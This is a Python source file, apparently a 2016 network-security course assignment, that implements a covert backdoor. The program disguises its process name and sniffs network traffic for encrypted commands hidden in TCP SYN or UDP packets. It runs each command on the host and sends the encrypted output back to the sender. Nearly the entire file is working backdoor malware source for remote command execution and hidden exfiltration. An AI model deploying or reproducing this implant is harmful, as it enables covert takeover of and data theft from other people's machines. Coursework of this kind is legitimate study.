#! /usr/bin/env python
# -*- coding: utf-8 -*-

# Mario Enriquez, 2016. COMP 8505 Assignment 3
#
# Backdoor program, hides itself using a mask on the process name,
# Waits for message, executes command and returns the result
# Run:
#		python sniffer.py mask_name interface filter dstport key

from scapy.all import *
from cyphermod import *
from maskname import *
from random import randint
import os
import sys
import subprocess
import time

def pkt_callback(pkt): #function called when the sniffer gets a packet
  try:
    layers = []
    counter = 0
    while True:		#get all the layers inside the packet
      layer = pkt.getlayer(counter)
      if (layer != None):
        layers.append(layer.name)
      else:
        break
      counter += 1
    valid=0
    if any("IP" in s for s in layers):
      valid=1
    if valid == 0:
      return
    if str(pkt[IP].proto) == "6":	#packet is TCP
      F = pkt['TCP'].flags
      if not F & 0x02: #check that the message is a SYN, to prevent getting nothing
        return
      payload = str(pkt[TCP].payload)   # We get payload from the TCP segment
      PROTO=TCP(sport=random.randint(1024,65535),dport=dstport)
    elif str(pkt[IP].proto) == "17": #packet is UDP
      payload = str(pkt[Raw].load)
      PROTO=UDP(sport=random.randint(1024,65535),dport=dstport)
    else: #packet is neither TCP nor UDP
      return
    decoded=decode(key,payload)	#calls function on cyphermod
    command = decoded.split(' ')
    command = filter(None, command)
    result = subprocess.Popen(command,stdout=subprocess.PIPE).communicate()[0] #execute command
    result = result + (" "* (16-(len(result)%16)))
    res=[result[i:i+800] for i in range(0, len(result), 800)] #divide result in several parts
    for i in res: #encrypt and send each part
      encoded=encode(key,i)
      if str(pkt[IP].proto) == "6":
        PROTO=TCP(sport=random.randint(1024,65535),dport=dstport)
      else:
        PROTO=UDP(sport=random.randint(1024,65535),dport=dstport)
      send(IP(dst=pkt[IP].src)/PROTO/encoded, verbose=0)
    encoded=encode(key,"END.............") #encrypt and send end message
    send(IP(dst=pkt[IP].src)/PROTO/encoded, verbose=0)
  except OSError as err:	#error message in case command is erroneous
    result = "OS error: {0}".format(err)
    result = result + (" "* (16-(len(result)%16)))
    encoded=encode(key,result) #encrypt and send error message
    send(IP(dst=pkt[IP].src)/PROTO/encoded, verbose=0)
    encoded=encode(key,"END.............") #encrypt and send end message
    send(IP(dst=pkt[IP].src)/PROTO/encoded, verbose=0)

def validate_key(key): #validates if key length is enough
  if len(key) > 32 or len(key) < 8:
    return False
  return True  

if len(sys.argv) != 6: #number of arguments is correct
  print("\n	Usage: python sniffer.py mask_name interface filter dstport key.\n")
  sys.exit()
if validate_key(sys.argv[5]) == False: #checks if key argument is correct
  print("\n	Please Input valid key: minimum 8 characters, maximum 32 characters")
  print("	Usage: python command.py dest_ip dest_port key\n")
  sys.exit()
mask=sys.argv[1]
interface=sys.argv[2]
sniff_filter=sys.argv[3]
dstport=int(sys.argv[4])
if len(sys.argv[5]) < 16: #transforms key to 16, 24 or 32 if not enough
  key=sys.argv[5] + (" "*(16-len(sys.argv[5])))
elif len(sys.argv[5]) < 24:
  key=sys.argv[5] + (" "*(24-len(sys.argv[5])))
elif len(sys.argv[5]) < 32:
  key=sys.argv[5] + (" "*(32-len(sys.argv[5])))
maskName(mask) #calls mask function
sniff(iface=interface, prn=pkt_callback, filter=sniff_filter, store=0) #start sniffing
